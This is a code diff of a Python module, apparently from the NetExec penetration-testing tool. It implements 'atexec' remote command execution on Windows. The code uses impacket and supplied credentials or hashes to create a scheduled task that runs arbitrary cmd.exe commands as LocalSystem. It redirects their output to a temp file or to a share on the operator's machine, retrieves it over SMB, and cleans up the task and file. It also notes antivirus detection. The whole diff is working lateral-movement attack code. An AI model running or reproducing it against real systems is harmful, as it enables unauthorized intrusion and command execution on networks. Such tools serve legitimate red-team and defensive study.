@@ -1,30 +1,14 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
 import os
 from impacket.dcerpc.v5 import tsch, transport
 from impacket.dcerpc.v5.dtypes import NULL
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
-from cme.helpers.misc import gen_random_string
+from nxc.helpers.misc import gen_random_string
 from time import sleep
+from datetime import datetime, timedelta
 
 
 class TSCH_EXEC:
-    def __init__(
-        self,
-        target,
-        share_name,
-        username,
-        password,
-        domain,
-        doKerberos=False,
-        aesKey=None,
-        kdcHost=None,
-        hashes=None,
-        logger=None,
-        tries=None,
-        share=None
-    ):
+    def __init__(self, target, share_name, username, password, domain, doKerberos=False, aesKey=None, remoteHost=None, kdcHost=None, hashes=None, logger=None, tries=None, share=None):
         self.__target = target
         self.__username = username
         self.__password = password
@@ -36,8 +20,11 @@ class TSCH_EXEC:
         self.__retOutput = False
         self.__aesKey = aesKey
         self.__doKerberos = doKerberos
+        self.__remoteHost = remoteHost
         self.__kdcHost = kdcHost
         self.__tries = tries
+        self.__output_filename = None
+        self.__share = share
         self.logger = logger
 
         if hashes is not None:
@@ -52,6 +39,7 @@ class TSCH_EXEC:
 
         stringbinding = r"ncacn_np:%s[\pipe\atsvc]" % self.__target
         self.__rpctransport = transport.DCERPCTransportFactory(stringbinding)
+        self.__rpctransport.setRemoteHost(self.__remoteHost)
 
         if hasattr(self.__rpctransport, "set_credentials"):
             # This method exists only for selected protocol sequences.
@@ -73,17 +61,20 @@ class TSCH_EXEC:
     def output_callback(self, data):
         self.__outputBuffer = data
 
-    def gen_xml(self, command, tmpFileName, fileless=False):
-        xml = """<?xml version="1.0" encoding="UTF-16"?>
+    def get_end_boundary(self):
+        # Get current date and time + 5 minutes
+        end_boundary = datetime.now() + timedelta(minutes=5)
+
+        # Format it to match the format in the XML: "YYYY-MM-DDTHH:MM:SS.ssssss"
+        return end_boundary.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3]
+
+    def gen_xml(self, command, fileless=False):
+        xml = f"""<?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <Triggers>
-    <CalendarTrigger>
-      <StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>
-      <Enabled>true</Enabled>
-      <ScheduleByDay>
-        <DaysInterval>1</DaysInterval>
-      </ScheduleByDay>
-    </CalendarTrigger>
+    <RegistrationTrigger>
+      <EndBoundary>{self.get_end_boundary()}</EndBoundary>
+    </RegistrationTrigger>
   </Triggers>
   <Principals>
     <Principal id="LocalSystem">
@@ -114,11 +105,12 @@ class TSCH_EXEC:
       <Command>cmd.exe</Command>
 """
         if self.__retOutput:
+            self.__output_filename = "\\Windows\\Temp\\" + gen_random_string(6)
             if fileless:
                 local_ip = self.__rpctransport.get_socket().getsockname()[0]
-                argument_xml = f"      <Arguments>/C {command} &gt; \\\\{local_ip}\\{self.__share_name}\\{tmpFileName} 2&gt;&amp;1</Arguments>"
+                argument_xml = f"      <Arguments>/C {command} &gt; \\\\{local_ip}\\{self.__share_name}\\{self.__output_filename} 2&gt;&amp;1</Arguments>"
             else:
-                argument_xml = f"      <Arguments>/C {command} &gt; %windir%\\Temp\\{tmpFileName} 2&gt;&amp;1</Arguments>"
+                argument_xml = f"      <Arguments>/C {command} &gt; {self.__output_filename} 2&gt;&amp;1</Arguments>"
 
         elif self.__retOutput is False:
             argument_xml = f"      <Arguments>/C {command}</Arguments>"
@@ -140,15 +132,12 @@ class TSCH_EXEC:
 
         dce.set_credentials(*self.__rpctransport.get_credentials())
         dce.connect()
-        # dce.set_auth_level(ntlm.NTLM_AUTH_PKT_PRIVACY)
-        
+
         tmpName = gen_random_string(8)
-        tmpFileName = tmpName + ".tmp"
 
-        xml = self.gen_xml(command, tmpFileName, fileless)
+        xml = self.gen_xml(command, fileless)
 
-        self.logger.info(f"Task XML: {xml}")
-        taskCreated = False
+        self.logger.debug(f"Task XML: {xml}")
         self.logger.info(f"Creating task \\{tmpName}")
         try:
             # windows server 2003 has no MSRPC_UUID_TSCHS, if it bind, it will return abstract_syntax_not_supported
@@ -161,11 +150,6 @@ class TSCH_EXEC:
             else:
                 self.logger.fail(str(e))
             return
-        else:
-            taskCreated = True
-
-        self.logger.info(f"Running task \\{tmpName}")
-        tsch.hSchRpcRun(dce, f"\\{tmpName}")
 
         done = False
         while not done:
@@ -178,44 +162,53 @@ class TSCH_EXEC:
 
         self.logger.info(f"Deleting task \\{tmpName}")
         tsch.hSchRpcDelete(dce, f"\\{tmpName}")
-        taskCreated = False
-
-        if taskCreated is True:
-            tsch.hSchRpcDelete(dce, "\\%s" % tmpName)
 
         if self.__retOutput:
             if fileless:
                 while True:
                     try:
-                        with open(os.path.join("/tmp", "cme_hosted", tmpFileName), "r") as output:
+                        with open(os.path.join("/tmp", "nxc_hosted", self.__output_filename)) as output:
                             self.output_callback(output.read())
                         break
-                    except IOError:
+                    except OSError:
                         sleep(2)
             else:
-                peer = ":".join(map(str, self.__rpctransport.get_socket().getpeername()))
+                ":".join(map(str, self.__rpctransport.get_socket().getpeername()))
                 smbConnection = self.__rpctransport.get_smb_connection()
-                tries = 1
+
+                tries = 0
+                # Give the command a bit of time to execute before we try to read the output, 0.4 seconds was good in testing
+                sleep(0.4)
                 while True:
                     try:
-                        self.logger.info(f"Attempting to read ADMIN$\\Temp\\{tmpFileName}")
-                        smbConnection.getFile("ADMIN$", f"Temp\\{tmpFileName}", self.output_callback)
+                        self.logger.info(f"Attempting to read {self.__share}\\{self.__output_filename}")
+                        smbConnection.getFile(self.__share, self.__output_filename, self.output_callback)
                         break
                     except Exception as e:
-                        if tries >= self.__tries:
-                            self.logger.fail(f'ATEXEC: Get output file error, maybe got detected by AV software, please increase the number of tries with the option "--get-output-tries". If it\'s still failing maybe something is blocking the schedule job, try another exec method')
+                        if tries > self.__tries:
+                            self.logger.fail("ATEXEC: Could not retrieve output file, it may have been detected by AV. Please increase the number of tries with the option '--get-output-tries'. If it is still failing, try the 'wmi' protocol or another exec method")
                             break
-                        if str(e).find("STATUS_BAD_NETWORK_NAME") >0 :
-                            self.logger.fail(f'ATEXEC: Get ouput failed, target has blocked ADMIN$ access (maybe command executed!)')
+                        if "STATUS_BAD_NETWORK_NAME" in str(e):
+                            self.logger.fail(f"ATEXEC: Getting the output file failed - target has blocked access to the share: {self.__share} (but the command may have executed!)")
                             break
-                        if str(e).find("SHARING") > 0 or str(e).find("STATUS_OBJECT_NAME_NOT_FOUND") >= 0:
-                            sleep(3)
+                        elif "STATUS_VIRUS_INFECTED" in str(e):
+                            self.logger.fail("Command did not run because a virus was detected")
+                            break
+                        # When executing powershell and the command is still running, we get a sharing violation
+                        # We can use that information to wait longer than if the file is not found (probably av or something)
+                        if "STATUS_SHARING_VIOLATION" in str(e):
+                            self.logger.info(f"File {self.__share}\\{self.__output_filename} is still in use with {self.__tries - tries} left, retrying...")
                             tries += 1
+                            sleep(1)
+                        elif "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
+                            self.logger.info(f"File {self.__share}\\{self.__output_filename} not found with {self.__tries - tries} left, deducting 10 tries and retrying...")
+                            tries += 10
+                            sleep(1)
                         else:
                             self.logger.debug(str(e))
 
                 if self.__outputBuffer:
-                    self.logger.debug(f"Deleting file ADMIN$\\Temp\\{tmpFileName}")
-                    smbConnection.deleteFile("ADMIN$", f"Temp\\{tmpFileName}")
+                    self.logger.debug(f"Deleting file {self.__share}\\{self.__output_filename}")
+                    smbConnection.deleteFile(self.__share, self.__output_filename)
 
         dce.disconnect()
